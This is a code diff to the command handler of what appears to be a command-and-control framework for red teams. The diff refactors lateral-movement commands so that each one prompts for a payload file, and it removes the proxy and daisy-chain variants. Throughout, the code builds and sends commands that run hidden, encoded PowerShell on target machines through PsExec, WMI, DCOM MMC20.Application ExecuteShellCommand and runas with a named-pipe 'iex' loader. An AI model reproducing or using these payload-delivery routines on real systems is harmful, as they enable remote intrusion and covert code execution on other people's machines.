@@ -83,12 +83,6 @@ def handle_ps_command(command, user, randomuri, implant_id):
     elif command.startswith("invoke-psexec ") or command.startswith("invoke-smbexec "):
         do_invoke_psexec(user, command, randomuri)
         return
-    elif command.startswith("invoke-psexecproxypayload "):
-        do_invoke_psexecproxypayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-psexecdaisypayload "):
-        do_invoke_psexecdaisypayload(user, command, randomuri)
-        return
     elif command.startswith("invoke-psexecpayload "):
         do_invoke_psexecpayload(user, command, randomuri)
         return
@@ -98,41 +92,17 @@ def handle_ps_command(command, user, randomuri, implant_id):
     elif command.startswith("invoke-wmijspbindpayload "):
         do_invoke_wmijspbindpayload(user, command, randomuri)
         return
-    elif command.startswith("invoke-wmijsproxypayload "):
-        do_invoke_wmijsproxypayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-wmijsdaisypayload "):
-        do_invoke_wmijsdaisypayload(user, command, randomuri)
-        return
     elif command.startswith("invoke-wmijspayload "):
         do_invoke_wmijspayload(user, command, randomuri)
         return
-    elif command.startswith("invoke-wmiproxypayload "):
-        do_invoke_wmiproxypayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-wmidaisypayload "):
-        do_invoke_wmidaisypayload(user, command, randomuri)
-        return
     elif command.startswith("invoke-wmipayload "):
         do_invoke_wmipayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-dcomproxypayload "):
-        do_invoke_dcomproxypayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-dcomdaisypayload "):
-        do_invoke_dcomdaisypayload(user, command, randomuri)
         return
     elif command.startswith("invoke-dcompayload "):
         do_invoke_dcompayload(user, command, randomuri)
         return
     elif command.startswith("invoke-runas "):
         do_invoke_runas(user, command, randomuri)
-        return
-    elif command.startswith("invoke-runasdaisypayload"):
-        do_invoke_runasdaisypayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-runasproxypayload"):
-        do_invoke_runasproxypayload(user, command, randomuri)
         return
     elif command.startswith("invoke-runaspayload"):
         do_invoke_runaspayload(user, command, randomuri)
@@ -302,46 +272,29 @@ def do_invoke_smbexec(user, command, randomuri):
 
 
 @creds()
-def do_invoke_psexecproxypayload(user, command, randomuri):
+def do_invoke_psexecpayload(user, command, randomuri):
     check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
+
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
+        return
+
+    if os.path.isfile(path):
+        with open(path, "r") as p:
             payload = p.read()
-        params = re.compile("invoke-psexecproxypayload ", re.IGNORECASE)
+        params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
         params = params.sub("", command)
         cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
         new_task(cmd, user, randomuri)
     else:
         print_bad("Need to run createproxypayload first")
         return
-
-
-@creds()
-def do_invoke_psexecdaisypayload(user, command, randomuri):
-    check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
-    daisyname = input("Payload name required: ")
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
-            payload = p.read()
-        params = re.compile("invoke-psexecdaisypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-        cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
-        new_task(cmd, user, randomuri)
-    else:
-        print_bad("Need to run createdaisypayload first")
-        return
-
-
-@creds()
-def do_invoke_psexecpayload(user, command, randomuri):
-    check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
-    C2 = get_c2server_all()
-    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
-    payload = newPayload.CreateRawBase()
-    params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    cmd = "invoke-psexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
-    new_task(cmd, user, randomuri)
 
 
 @creds()
@@ -380,131 +333,76 @@ def do_invoke_wmijspbindpayload(user, command, randomuri):
 
 
 @creds()
-def do_invoke_wmijsproxypayload(user, command, randomuri):
-    check_module_loaded("New-JScriptShell.ps1", randomuri, user)
-    if os.path.isfile(("%s%sDotNet2JS.b64" % (PayloadsDirectory, "Proxy"))):
-        with open("%s%sDotNet2JS.b64" % (PayloadsDirectory, "Proxy"), "r") as p:
-            payload = p.read()
-        params = re.compile("invoke-wmijsproxypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-        new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS.b64" % (PayloadsDirectory, "Proxy")), user, randomuri)
-        cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
-        new_task(cmd, user, randomuri)
-    else:
-        print_bad("Need to run createproxypayload first")
-        return
-
-
-@creds()
-def do_invoke_wmijsdaisypayload(user, command, randomuri):
-    check_module_loaded("New-JScriptShell.ps1", randomuri, user)
-    daisyname = input("Name required: ")
-    if os.path.isfile(("%s%sDotNet2JS.b64" % (PayloadsDirectory, daisyname))):
-        with open("%s%sDotNet2JS.b64" % (PayloadsDirectory, daisyname), "r") as p:
-            payload = p.read()
-        params = re.compile("invoke-wmijsdaisypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-        new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS.b64" % (PayloadsDirectory, daisyname)), user, randomuri)
-        cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
-        new_task(cmd, user, randomuri)
-    else:
-        print_bad("Need to run createdaisypayload first")
-        return
-
-
-@creds()
 def do_invoke_wmijspayload(user, command, randomuri):
     check_module_loaded("New-JScriptShell.ps1", randomuri, user)
-    with open("%s%sDotNet2JS.b64" % (PayloadsDirectory, ""), "r") as p:
-        payload = p.read()
-    params = re.compile("invoke-wmijspayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS.b64" % (PayloadsDirectory, "")), user, randomuri)
-    cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
-    new_task(cmd, user, randomuri)
-
-
-@creds()
-def do_invoke_wmiproxypayload(user, command, randomuri):
-    check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
-            payload = p.read()
-        params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-        cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
-        new_task(cmd, user, randomuri)
-    else:
-        print_bad("Need to run createproxypayload first")
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
         return
 
-
-@creds()
-def do_invoke_wmidaisypayload(user, command, randomuri):
-    check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
-    daisyname = input("Name required: ")
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
+    if os.path.isfile(path):
+        with open(path, "r") as p:
             payload = p.read()
-        params = re.compile("invoke-wmidaisypayload ", re.IGNORECASE)
+        params = re.compile("invoke-wmijspayload ", re.IGNORECASE)
         params = params.sub("", command)
-        cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
+        new_task("$Shellcode64=\"%s\" #%s" % (payload, path), user, randomuri)
+        cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
         new_task(cmd, user, randomuri)
     else:
-        print_bad("Need to run createdaisypayload first")
+        print_bad("Need to run createnewpayload first")
         return
 
 
 @creds()
 def do_invoke_wmipayload(user, command, randomuri):
     check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
-    C2 = get_c2server_all()
-    newPayload = Payloads(C2.KillDate, C2.EncKey,  C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
-    payload = newPayload.CreateRawBase()
-    params = re.compile("invoke-wmipayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
-    new_task(cmd, user, randomuri)
-
-
-@creds()
-def do_invoke_dcomproxypayload(user, command, randomuri):
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
-            payload = p.read()
-        params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-        p = re.compile(r'(?<=-target.).*')
-        target = re.search(p, command).group()
-        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c %s\",\"7\")" % (target, payload)
-        new_task(pscommand, user, randomuri)
-    else:
-        print_bad("Need to run createproxypayload first")
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
         return
 
-
-def do_invoke_dcomdaisypayload(user, command, randomuri):
-    daisyname = input("Name required: ")
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
+    if os.path.isfile(path):
+        with open(path, "r") as p:
             payload = p.read()
-        p = re.compile(r'(?<=-target.).*')
-        target = re.search(p, command).group()
-        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
-        new_task(pscommand, user, randomuri)
+        params = re.compile("invoke-wmipayload ", re.IGNORECASE)
+        params = params.sub("", command)
+        cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
+        new_task(cmd, user, randomuri)
     else:
         print_bad("Need to run createdaisypayload first")
         return
 
 
 def do_invoke_dcompayload(user, command, randomuri):
-    C2 = get_c2server_all()
-    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
-    payload = newPayload.CreateRawBase()
-    p = re.compile(r'(?<=-target.).*')
-    target = re.search(p, command).group()
-    pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
-    new_task(pscommand, user, randomuri)
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
+        return
+    if os.path.isfile(path):
+        with open(path, "r") as p:
+            payload = p.read()
+        p = re.compile(r'(?<=-target.).*')
+        target = re.search(p, command).group()
+        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
+        new_task(pscommand, user, randomuri)
+    else:
+        print_bad("Need to run createnewpayload first")
+        return
 
 
 @creds(accept_hashes=False)
@@ -517,10 +415,18 @@ def do_invoke_runas(user, command, randomuri):
 
 
 @creds(accept_hashes=False)
-def do_invoke_runasdaisypayload(user, command, randomuri):
-    daisyname = input("Name required: ")
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
+def do_invoke_runaspayload(user, command, randomuri):
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
+        return
+    if os.path.isfile(path):
+        with open(path, "r") as p:
             payload = p.read()
         new_task("$proxypayload = \"%s\"" % payload, user, randomuri)
         check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
@@ -531,41 +437,8 @@ def do_invoke_runasdaisypayload(user, command, randomuri):
         pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
         new_task(pscommand, user, randomuri)
     else:
-        print("Need to run createdaisypayload first")
+        print("Need to run createnewpayload first")
         return
-
-
-@creds(accept_hashes=False)
-def do_invoke_runasproxypayload(user, command, randomuri):
-    C2 = get_c2server_all()
-    if C2.ProxyURL == "":
-        print_bad("Need to run createproxypayload first")
-        return
-    else:
-        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent,
-                              C2.Referrer, "%s?p" % get_newimplanturl(), PayloadsDirectory)
-        payload = newPayload.CreateRawBase()
-        proxyvar = "$proxypayload = \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % payload
-        new_task(proxyvar, user, randomuri)
-        check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
-        check_module_loaded("NamedPipeProxy.ps1", randomuri, user)
-        params = re.compile("invoke-runasproxypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-
-        pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
-        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
-        new_task(pscommand, user, randomuri)
-
-
-@creds(accept_hashes=False)
-def do_invoke_runaspayload(user, command, randomuri):
-    check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
-    check_module_loaded("NamedPipe.ps1", randomuri, user)
-    params = re.compile("invoke-runaspayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
-    pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
-    new_task(pscommand, user, randomuri)
 
 
 def do_help(user, command, randomuri):
